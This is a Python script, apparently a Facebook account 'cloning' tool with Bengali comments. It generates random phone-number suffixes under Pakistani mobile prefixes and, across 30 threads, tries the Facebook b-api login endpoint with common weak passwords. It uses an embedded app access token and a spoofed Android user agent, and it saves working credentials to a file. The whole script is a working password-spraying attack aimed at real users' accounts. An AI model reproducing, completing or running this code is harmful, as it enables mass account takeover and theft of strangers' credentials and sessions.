#!/usr/bin/python3
# coding=utf-8

import os
import sys
import time
import random
import json
import threading
import urllib.request
import urllib.parse
import urllib.error
from multiprocessing.pool import ThreadPool

# লাইব্রেরি ইমপোর্ট চেক
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

try:
    import mechanize
except ImportError:
    os.system('pip install mechanize')
    import mechanize

# ব্রাউজার সেটআপ
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
user_agent = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM={density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
br.addheaders = [('User-Agent', user_agent)]

# গ্লোবাল ভেরিয়েবল
oks = []
cpb = []
id_list = []

# লোগো এবং ডিজাইন
logo1 = """
  🄹🄰🄲🄺🅂🄾🄽 🄼🄰🄽🄳🄴🄻🄰
╔══─────────────────────╗
║ OWNER: JACKSON-MANDELA ║
║ GITHUB: HIDDEN         ║
╚══─────────────────────╝"""

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def login_system():
    os.system("clear")
    CorrectUsername = "JKM"
    CorrectPassword = "JKM2026"
    
    while True:
        username = input("\033[1;97mTool Username » ")
        if username == CorrectUsername:
            password = input("\033[1;97mTool Password » ")
            if password == CorrectPassword:
                print("Logged in successfully!")
                time.sleep(1)
                break
            else:
                print("\033[1;91mWrong Password")
        else:
            print("\033[1;91mWrong Username")

def generate_ids():
    if os.path.exists('.txt'):
        os.remove('.txt')
    print("\033[1;94mGenerating ID list...")
    with open('.txt', 'w') as f:
        for _ in range(1000): # টেস্টের জন্য ১০০০টি আইডি
            nmbr = random.randint(1111111, 9999999)
            f.write(str(nmbr) + '\n')
    print("Generation Complete.")

def login():
    os.system('clear')
    print(logo1)
    print("\033[1;93m[1] START CLONING")
    print("\033[1;95m[2] EXIT")
    peak = input("\nCHOOSE : ")
    if peak == "1":
        action()
    else:
        sys.exit()

def action():
    os.system("clear")
    print(logo1)
    print("\033[1;94mEnter Pakistan Mobile Code (e.g., 01, 02...)")
    code = input("\033[1;97mCHOOSE : ")
    k = "03"
    
    try:
        with open('.txt', 'r') as f:
            for line in f:
                id_list.append(line.strip())
    except FileNotFoundError:
        print("ID file not found. Generating now...")
        generate_ids()
        return action()

    print(50*'-')
    print(f'Total IDs: {len(id_list)}')
    print('Cracking Started...')
    print(50*'-')

    def crack(user):
        global oks, cpb
        passwords = [user, "Pakistan", "123456", "786786"]
        for pw in passwords:
            try:
                # নোট: b-api বর্তমানে কাজ নাও করতে পারে ফেসবুকের সিকিউরিটির কারণে
                url = f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%7C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email={k}{code}{user}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1'
                response = br.open(url)
                q = json.load(response)
                
                if 'access_token' in q:
                    print(f'\x1b[1;32m[OK] {k}{code}{user} | {pw}')
                    oks.append(user)
                    with open('save/ok.txt', 'a') as f: f.write(f'{k}{code}{user}|{pw}\n')
                    break
                elif 'www.facebook.com' in q.get('error_msg', ''):
                    print(f'\033[1;97m[CP] {k}{code}{user} | {pw}')
                    cpb.append(user)
                    break
            except:
                pass

    pool = ThreadPool(30)
    pool.map(crack, id_list)
    print("\nProcess Completed.")
    print(f"Total OK: {len(oks)} | Total CP: {len(cpb)}")

if __name__ == '__main__':
    login_system()
    generate_ids()
    login()
